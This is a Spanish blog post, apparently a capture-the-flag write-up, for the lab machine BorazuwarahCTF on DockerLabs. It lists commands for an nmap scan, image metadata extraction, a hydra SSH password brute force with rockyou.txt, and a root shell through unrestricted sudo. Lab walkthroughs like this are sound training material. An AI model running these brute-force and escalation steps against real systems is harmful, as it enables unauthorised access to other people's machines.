---
layout: post
title: "BorazuwarahCTF"
date: 2024-08-15 17:25:23
category: dockerlabs
vm: dockerlabs
---

<table class="log">
  <tr>
    <td rowspan="5"><img src="/notas/public/img/dockerlabs/dockerlabs.png" width=260></td>
    <td></td>
  </tr>
  <tr> <td><strong>Máquina:</strong> BorazuwarahCTF </td> </tr>
  <tr> <td><strong>SO:</strong> Linux</td> </tr>
  <tr> <td><strong>Nivel:</strong> <span class="easy">Muy Facil</span></td> </tr>
  <tr> <td><strong><a href="https://dockerlabs.es" target="_blank"> DockerLabs</a></strong></td> </tr>
</table>

<br>


![img](/notas/public/img/dockerlabs/borazuwarahctf/host.png){:.margin}

**1\.** Aqui tenemos los puertos escaneados de la maquina.

`sudo nmap -p- -sS -T5 --min-rate=5000 -sCV -n -Pn 172.17.0.2`

![img](/notas/public/img/dockerlabs/borazuwarahctf/nmap.png){:.margin}

**2\.** En la web tenemos una imagen.

`http://172.17.0.2`

![img](/notas/public/img/dockerlabs/borazuwarahctf/80.png){:.margin}

**3\.** Descargo la imagen de la web para analizar sus metadatos. 

`wget http://172.17.0.2/imagen.jpeg -q`

`exiftool imagen.jpeg`

![img](/notas/public/img/dockerlabs/borazuwarahctf/exiftool.png){:.margin}

**4\.** Toca hacer fuerza bruta a la contraseña de borazuwarah por ssh.

`hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`

![img](/notas/public/img/dockerlabs/borazuwarahctf/hydra.png){:.margin}

**5\.** Me conecto por ssh con el usuario borazuwarah.

`ssh borazuwarah@172.17.0.2`

![img](/notas/public/img/dockerlabs/borazuwarahctf/ssh.png){:.margin}

**6\.** Escalando privilegios.

_6.1- Reviso los permisos sudo del usuario, tengo todos los permisos_

`sudo -l`

![img](/notas/public/img/dockerlabs/borazuwarahctf/sudol.png){:.margin}

_6.2- Ejecutamos la bash como sudo_

`sudo /bin/bash`

![img](/notas/public/img/dockerlabs/borazuwarahctf/root.png){:.margin}

<br>

<a href="#">_Finalizado._</a>